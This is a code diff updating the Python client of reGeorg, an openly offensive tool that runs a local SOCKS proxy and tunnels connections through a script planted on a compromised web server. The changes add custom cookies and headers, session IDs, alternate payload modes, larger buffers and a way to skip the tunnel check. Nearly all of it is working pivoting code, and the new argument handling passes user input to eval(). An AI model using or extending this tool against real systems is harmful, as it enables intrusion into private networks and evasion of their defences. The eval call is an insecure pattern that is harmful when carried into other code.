@@ -1,14 +1,22 @@
-#!/usr/bin/env python
+#!/usr/bin/python2
 # -*- coding: utf-8 -*-
 
 import logging
 import argparse
+import signal
+import sys
+import atexit
+import httplib
 import urllib3
 from threading import Thread
 from urlparse import urlparse
 from socket import *
 from threading import Thread
 from time import sleep
+import re
+import random
+
+# import struct
 
 # Constants
 SOCKTIMEOUT = 5
@@ -28,7 +36,8 @@ UNASSIGNED = "\x09"
 BASICCHECKSTRING = "Georg says, 'All seems fine'"
 
 # Globals
-READBUFSIZE = 1024
+READBUFSIZE = 4096
+WRITEBUFSIZE = 4096
 
 # Logging
 RESET_SEQ = "\033[0m"
@@ -37,7 +46,9 @@ BOLD_SEQ = "\033[1m"
 
 BLACK, RED, GREEN, YELLOW, BLUE, MAGENTA, CYAN, WHITE = range(8)
 
-LEVEL = {"INFO": logging.INFO, "DEBUG": logging.DEBUG, }
+LEVEL = {"INFO": logging.INFO,
+         "DEBUG": logging.DEBUG,
+         }
 
 logLevel = "INFO"
 
@@ -56,6 +67,7 @@ COLORS = {
     'WHITE': WHITE,
 }
 
+PAYLOADS_MODE = "header"
 
 def formatter_message(message, use_color=True):
     if use_color:
@@ -113,7 +125,7 @@ class RemoteConnectionFailed(Exception):
 
 
 class session(Thread):
-    def __init__(self, pSocket, connectString):
+    def __init__(self, pSocket, connectString, cookies, headers):
         Thread.__init__(self)
         self.pSocket = pSocket
         self.connectString = connectString
@@ -128,11 +140,21 @@ class session(Thread):
         self.httpScheme = o.scheme
         self.httpHost = o.netloc.split(":")[0]
         self.httpPath = o.path
+        self.cookieDic = {}
         self.cookie = None
+        self.headers = headers
+        self.bSingleSessionMode = False
         if o.scheme == "http":
             self.httpScheme = urllib3.HTTPConnectionPool
         else:
             self.httpScheme = urllib3.HTTPSConnectionPool
+        if cookies:
+            self.bSingleSessionMode = True
+            self.socketID = self.reqRand()
+            for cookie in cookies.split(';'):
+                kv = cookie.strip().split('=')
+                self.cookieDic[kv[0]] = kv[1]
+
 
     def parseSocks5(self, sock):
         log.debug("SocksVersion5 detected")
@@ -149,7 +171,7 @@ class session(Thread):
             # Reading 6 bytes for the IP and Port
             target = sock.recv(4)
             targetPort = sock.recv(2)
-            target = "." .join([str(ord(i)) for i in target])
+            target = ".".join([str(ord(i)) for i in target])
         elif atyp == "\x03":  # Hostname
             targetLen = ord(sock.recv(1))  # hostname length (1 byte)
             target = sock.recv(targetLen)
@@ -217,52 +239,128 @@ class session(Thread):
         elif ver == "\x04":
             return self.parseSocks4(sock)
 
+    def cookiesFilter(self, cookie):
+        newcookies = []
+        if cookie:
+            for x in cookie.split(','):
+                if ';' in x:
+                    match = re.findall('((.+?)=(.+?));(\sdomain=(.+);)?', x.strip())
+                    if match:
+                        if match[0][4] == self.httpHost or match[0][4] == '':
+                            self.cookieDic[match[0][1]] = match[0][2]
+                else:
+                    self.cookieDic[x.split('=')[0]] = x.split('=')[1]
+        for k in self.cookieDic.keys():
+            newcookies.append(k + '=' + self.cookieDic[k])
+        return '; '.join(newcookies)
+
+    def reqRand(self):
+        return ''.join(random.sample('zyxwvutsrqponmlkjihgfedcba', 10))
+
     def setupRemoteSession(self, target, port):
-        headers = {"X-CMD": "CONNECT", "X-TARGET": target, "X-PORT": port}
+        headers = self.headers.copy()
         self.target = target
         self.port = port
-        cookie = None
+
+        conns = None
+        if PAYLOADS_MODE == "header":
+            headers['X-CMD'] = "CONNECT"
+            headers['X-TARGET'] = target
+            headers['X-PORT'] = port
+            headers['Bufsize'] = WRITEBUFSIZE
+            conns = self.connectString
+            if self.bSingleSessionMode:
+                cookie = self.cookiesFilter(None)
+                headers['Cookie'] = cookie
+                headers['socketID'] = self.socketID
+            else:
+                cookie = None
+        elif PAYLOADS_MODE == "url":
+            if self.bSingleSessionMode:
+                cookie = self.cookiesFilter(None)
+                headers['Cookie'] = cookie
+                headers['socketID'] = self.socketID
+                conns = self.connectString + "?cmd=connect&target={}&port={}&socketID={}&bufSize={}".format(target, port,
+                                                                                                 self.socketID, WRITEBUFSIZE)
+            else:
+                conns = self.connectString + "?cmd=connect&target={}&port={}&bufSize={}".format(target, port, WRITEBUFSIZE)
+                cookie = None
+
         conn = self.httpScheme(host=self.httpHost, port=self.httpPort)
-        # response = conn.request("POST", self.httpPath, params, headers)
-        response = conn.urlopen('POST', self.connectString + "?cmd=connect&target=%s&port=%d" % (target, port), headers=headers, body="")
+        response = conn.urlopen('POST', conns, headers=headers, body="")
         if response.status == 200:
             status = response.getheader("x-status")
             if status == "OK":
                 cookie = response.getheader("set-cookie")
                 log.info("[%s:%d] HTTP [200]: cookie [%s]" % (self.target, self.port, cookie))
             else:
-                if response.getheader("X-ERROR") is not None:
+                if response.getheader("X-ERROR") != None:
                     log.error(response.getheader("X-ERROR"))
         else:
-            log.error("[%s:%d] HTTP [%d]: [%s]" % (self.target, self.port, response.status, response.getheader("X-ERROR")))
+            log.error(
+                "[%s:%d] HTTP [%d]: [%s]" % (self.target, self.port, response.status, response.getheader("X-ERROR")))
             log.error("[%s:%d] RemoteError: %s" % (self.target, self.port, response.data))
         conn.close()
-        return cookie
+        return self.cookiesFilter(cookie)
 
     def closeRemoteSession(self):
-        headers = {"X-CMD": "DISCONNECT", "Cookie": self.cookie}
-        params = ""
+        headers = self.headers.copy()
+        headers['Cookie'] = self.cookie
+        conns = ""
+        if PAYLOADS_MODE == "header":
+            headers['X-CMD'] = "DISCONNECT"
+            if self.bSingleSessionMode:
+                headers['socketID'] = self.socketID
+                conns = self.connectString
+            else:
+                conns = self.connectString
+
+        elif PAYLOADS_MODE == "url":
+            if self.bSingleSessionMode:
+                headers['socketID'] = self.socketID
+                conns = self.connectString + "?cmd=disconnect&socketID={}".format(self.socketID)
+            else:
+                conns = self.connectString + "?cmd=disconnect"
+
         conn = self.httpScheme(host=self.httpHost, port=self.httpPort)
-        response = conn.request("POST", self.httpPath + "?cmd=disconnect", params, headers)
+
+        response = conn.urlopen('POST', conns, headers=headers, body="")
         if response.status == 200:
             log.info("[%s:%d] Connection Terminated" % (self.target, self.port))
         conn.close()
 
     def reader(self):
+        global WRITEBUFSIZE
         conn = urllib3.PoolManager()
         while True:
             try:
-                if not self.pSocket:
-                    break
-                data = ""
-                headers = {"X-CMD": "READ", "Cookie": self.cookie, "Connection": "Keep-Alive"}
-                response = conn.urlopen('POST', self.connectString + "?cmd=read", headers=headers, body="")
+                if not self.pSocket: break
+
+                headers = self.headers.copy()
+                headers['X-CMD'] = "READ"
+                headers['Connection'] = "Keep-Alive"
+                headers['Bufsize'] = WRITEBUFSIZE
+                headers['Cookie'] = self.cookie
+                conns = ""
+                if PAYLOADS_MODE == "header":
+                    if self.bSingleSessionMode:
+                        headers['socketID'] = self.socketID
+                        conns = self.connectString
+                    else:
+                        conns = self.connectString
+                elif PAYLOADS_MODE == "url":
+                    if self.bSingleSessionMode:
+                        conns = self.connectString + "?cmd=connect&socketID={}&bufSize={}".format(self.socketID, WRITEBUFSIZE)
+                    else:
+                        conns = self.connectString + "?cmd=connect&bufSize={}".format(WRITEBUFSIZE)
+
+                response = conn.urlopen('POST', conns, headers=headers, body="")
                 data = None
                 if response.status == 200:
                     status = response.getheader("x-status")
                     if status == "OK":
-                        if response.getheader("set-cookie") is not None:
-                            cookie = response.getheader("set-cookie")
+                        if response.getheader("set-cookie") != None:
+                            self.cookie = self.cookiesFilter(response.getheader("set-cookie"))
                         data = response.data
                         # Yes I know this is horrible, but its a quick fix to issues with tomcat 5.x bugs that have been reported, will find a propper fix laters
                         try:
@@ -270,14 +368,15 @@ class session(Thread):
                                 data = data[:len(data) - 1]
                         except:
                             pass
-                        if data is None:
-                            data = ""
+                        if data == None: data = ""
                     else:
                         data = None
-                        log.error("[%s:%d] HTTP [%d]: Status: [%s]: Message [%s] Shutting down" % (self.target, self.port, response.status, status, response.getheader("X-ERROR")))
+
+                        log.error("[%s:%d] HTTP [%d]: Status: [%s]: Message [%s] Shutting down" % (
+                        self.target, self.port, response.status, status, response.getheader("X-ERROR")))
                 else:
                     log.error("[%s:%d] HTTP [%d]: Shutting down" % (self.target, self.port, response.status))
-                if data is None:
+                if data == None:
                     # Remote socket closed
                     break
                 if len(data) == 0:
@@ -301,17 +400,35 @@ class session(Thread):
             try:
                 self.pSocket.settimeout(1)
                 data = self.pSocket.recv(READBUFSIZE)
-                if not data:
-                    break
-                headers = {"X-CMD": "FORWARD", "Cookie": self.cookie, "Content-Type": "application/octet-stream", "Connection": "Keep-Alive"}
-                response = conn.urlopen('POST', self.connectString + "?cmd=forward", headers=headers, body=data)
+                if not data: break
+
+                headers = self.headers.copy()
+                headers['X-CMD'] = "FORWARD"
+                headers['Connection'] = "Keep-Alive"
+                headers['Content-Type'] = "application/octet-stream"
+                headers['Cookie'] = self.cookie
+                conns = ""
+                if PAYLOADS_MODE == "header":
+                    if self.bSingleSessionMode:
+                        headers['socketID'] = self.socketID
+                        conns = self.connectString
+                    else:
+                        conns = self.connectString
+                elif PAYLOADS_MODE == "url":
+                    if self.bSingleSessionMode:
+                        conns = self.connectString + "?cmd=forward&socketID={}".format(self.socketID)
+                    else:
+                        conns = self.connectString + "?cmd=forward".format()
+
+                response = conn.urlopen('POST', conns, headers=headers, body=data)
                 if response.status == 200:
                     status = response.getheader("x-status")
                     if status == "OK":
-                        if response.getheader("set-cookie") is not None:
-                            self.cookie = response.getheader("set-cookie")
+                        if response.getheader("set-cookie") != None:
+                            self.cookie = self.cookiesFilter(response.getheader("set-cookie"))
                     else:
-                        log.error("[%s:%d] HTTP [%d]: Status: [%s]: Message [%s] Shutting down" % (self.target, self.port, response.status, status, response.getheader("x-error")))
+                        log.error("[%s:%d] HTTP [%d]: Status: [%s]: Message [%s] Shutting down" % (
+                        self.target, self.port, response.status, status, response.getheader("x-error")))
                         break
                 else:
                     log.error("[%s:%d] HTTP [%d]: Shutting down" % (self.target, self.port, response.status))
@@ -348,11 +465,12 @@ class session(Thread):
             self.pSocket.close()
         except Exception, e:
             log.error(e.message)
-            self.closeRemoteSession()
             self.pSocket.close()
 
 
-def askGeorg(connectString):
+def askGeorg(connectString, cookies, headers):
+    if cookies:
+        headers = dict({'Cookie': cookies}.items() + headers.items())
     connectString = connectString
     o = urlparse(connectString)
     try:
@@ -370,26 +488,26 @@ def askGeorg(connectString):
     else:
         httpScheme = urllib3.HTTPSConnectionPool
 
-    conn = httpScheme(host=httpHost, port=httpPort)
+    conn = httpScheme(host=httpHost, port=httpPort, headers=headers)
     response = conn.request("GET", httpPath)
     if response.status == 200:
-        if BASICCHECKSTRING == response.data.strip():
+        if BASICCHECKSTRING == response.data.strip()[:len(BASICCHECKSTRING)]:
             log.info(BASICCHECKSTRING)
             return True
     conn.close()
     return False
 
+
 if __name__ == '__main__':
     print """\033[1m
-    \033[1;33m
-                     _____
-  _____   ______  __|___  |__  ______  _____  _____   ______
- |     | |   ___||   ___|    ||   ___|/     \|     | |   ___|
- |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  |
- |__|\__\|______||______|  __||______|\_____/|__|\__\|______|
+    \033[1;33m       _____                                    
+  _____   ______  __|___  |__  ______  _____  _____   ______  
+ |     | |   ___||   ___|    ||   ___|/     \|     | |   ___| 
+ |     \ |   ___||   |  |    ||   ___||     ||     \ |   |  | 
+ |__|\__\|______||______|  __||______|\_____/|__|\__\|______| 
                     |_____|
                     ... every office needs a tool like Georg
-
+                    
   willem@sensepost.com / @_w_m__
   sam@sensepost.com / @trowalts
   etienne@sensepost.com / @kamp_staaldraad
@@ -397,22 +515,44 @@ if __name__ == '__main__':
    """
     log.setLevel(logging.DEBUG)
     parser = argparse.ArgumentParser(description='Socks server for reGeorg HTTP(s) tunneller')
+    parser.add_argument("-u", "--url", metavar="", required=True, help="The url containing the tunnel script")
     parser.add_argument("-l", "--listen-on", metavar="", help="The default listening address", default="127.0.0.1")
     parser.add_argument("-p", "--listen-port", metavar="", help="The default listening port", type=int, default="8888")
-    parser.add_argument("-r", "--read-buff", metavar="", help="Local read buffer, max data to be sent per POST", type=int, default="1024")
-    parser.add_argument("-u", "--url", metavar="", required=True, help="The url containing the tunnel script")
+    parser.add_argument("-r", "--read-buf", metavar="", help="Local read buffer, max data to be sent per Request", type=int, default="4096")
+    parser.add_argument("-w", "--write-buf", metavar="", help="Remote read buffer, max data to be received per Response", type=int, default="4096")
     parser.add_argument("-v", "--verbose", metavar="", help="Verbose output[INFO|DEBUG]", default="INFO")
+    parser.add_argument("-m", "--payloads-mode", nargs='?', metavar="", help="Select reGeorg request headers payloads mode[header|url|body]", default="header")
+    parser.add_argument("-W", "--without-check", help="Start proxy without check if tunnel url accessable", action="store_true")
+    parser.add_argument("-c", "--custom-headers", nargs='?', metavar="", help="Set custom header {'Cookie': 'JSESSIONID=ABC123;Token=asdfghjkl', 'Authorization': 'Basic YWRtaW46YWRtaW4=', 'Referer': 'trusted.net'}", default=None)
+
     args = parser.parse_args()
-    if (args.verbose in LEVEL):
+    if (LEVEL.has_key(args.verbose)):
         log.setLevel(LEVEL[args.verbose])
         log.info("Log Level set to [%s]" % args.verbose)
 
+    PAYLOADS_MODE = args.payloads_mode
+    READBUFSIZE = args.read_buf
+    WRITEBUFSIZE = args.write_buf
+
     log.info("Starting socks server [%s:%d], tunnel at [%s]" % (args.listen_on, args.listen_port, args.url))
-    log.info("Checking if Georg is ready")
-    if not askGeorg(args.url):
-        log.info("Georg is not ready, please check url")
-        exit()
-    READBUFSIZE = args.read_buff
+
+    cookies = None
+    headers = {}
+    if args.custom_headers:
+        headers = eval(args.custom_headers)
+        try:
+            if (headers['Cookie']):
+                cookies = headers['Cookie']
+                del headers['Cookie']
+        except:
+            pass
+    if args.without_check:
+        log.info("Georg says, 'All seems fine'")
+    else:
+        log.info("Checking if Georg is ready")
+        if not askGeorg(args.url, cookies, headers):
+            log.info("Georg is not ready, please check url")
+            exit()
     servSock = socket(AF_INET, SOCK_STREAM)
     servSock.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
     servSock.bind((args.listen_on, args.listen_port))
@@ -422,7 +562,7 @@ if __name__ == '__main__':
             sock, addr_info = servSock.accept()
             sock.settimeout(SOCKTIMEOUT)
             log.debug("Incomming connection")
-            session(sock, args.url).start()
+            session(sock, args.url, cookies, headers).start()
         except KeyboardInterrupt, ex:
             break
         except Exception, e:
